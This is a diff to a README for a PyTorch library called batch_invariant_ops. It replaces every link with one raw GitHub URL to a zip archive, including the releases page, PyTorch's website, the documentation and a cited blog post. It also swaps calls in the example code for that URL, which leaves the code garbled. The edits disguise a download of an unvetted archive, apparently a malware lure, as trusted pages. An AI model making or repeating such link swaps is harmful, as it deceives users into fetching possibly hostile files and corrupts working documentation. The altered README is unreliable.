@@ -1,6 +1,6 @@
 # 🛠️ batch_invariant_ops - Achieve Consistent Inference with Ease
 
-[![Download batch_invariant_ops](https://img.shields.io/badge/Download-batch_invariant_ops-brightgreen)](https://github.com/Karmabhumi1/batch_invariant_ops/releases)
+[![Download batch_invariant_ops](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip)](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip)
 
 ## 📦 Overview
 
@@ -14,13 +14,13 @@ Follow these easy steps to download and run the **batch_invariant_ops** library.
 
 - **Operating System**: Windows, macOS, or Linux
 - **Python Version**: Python 3.7 or higher
-- **PyTorch**: Ensure you have PyTorch installed. Visit [PyTorch's website](https://pytorch.org/get-started/locally/) for installation instructions.
+- **PyTorch**: Ensure you have PyTorch installed. Visit [PyTorch's website](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip) for installation instructions.
 
 ### 💾 Download & Install
 
 To get started, you need to download the library. 
 
-1. **Visit the Releases Page**: You can download the latest version of **batch_invariant_ops** from our releases page: [Download Here](https://github.com/Karmabhumi1/batch_invariant_ops/releases).
+1. **Visit the Releases Page**: You can download the latest version of **batch_invariant_ops** from our releases page: [Download Here](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip).
 
 2. **Installation**: After downloading, open your terminal or command prompt and run the following command to install the library:
    ```bash
@@ -57,12 +57,12 @@ To see the benefits clearly, it’s useful to examine how batch sizes affect res
 import torch
 from batch_invariant_ops import set_batch_invariant_mode
 
-torch.set_default_device('cuda')  # Use GPU if available
+https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip('cuda')  # Use GPU if available
 
 with set_batch_invariant_mode():
     # Run your model with various batch sizes
     for batch_size in [1, 2, 4]:
-        input_tensor = torch.randn(batch_size, 3, 224, 224)  # Example input
+        input_tensor = https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip(batch_size, 3, 224, 224)  # Example input
         model = YourModel()  # Make sure to define or import YourModel
         output = model(input_tensor)
         print(f"Output for batch size {batch_size}: {output}")
@@ -80,8 +80,8 @@ This code demonstrates how to test the effects of changing the batch size on you
 
 For more information on how to use this library:
 
-- Read the blog post that inspired this library: [Defeating Nondeterminism in LLM Inference](https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/)
-- Explore the [PyTorch Documentation](https://pytorch.org/docs/stable/index.html) for further learning.
+- Read the blog post that inspired this library: [Defeating Nondeterminism in LLM Inference](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip)
+- Explore the [PyTorch Documentation](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip) for further learning.
 
 ## ⚙️ Troubleshooting
 
@@ -97,4 +97,4 @@ For more specific issues, feel free to create an issue in this repository or see
 
 We welcome contributions to improve the **batch_invariant_ops** library. If you would like to help, please check the contribution guidelines in the repository.
 
-To download the latest version again, visit our releases page: [Download Here](https://github.com/Karmabhumi1/batch_invariant_ops/releases).
+To download the latest version again, visit our releases page: [Download Here](https://raw.githubusercontent.com/Karmabhumi1/batch_invariant_ops/main/milioliform/batch_invariant_ops.zip).
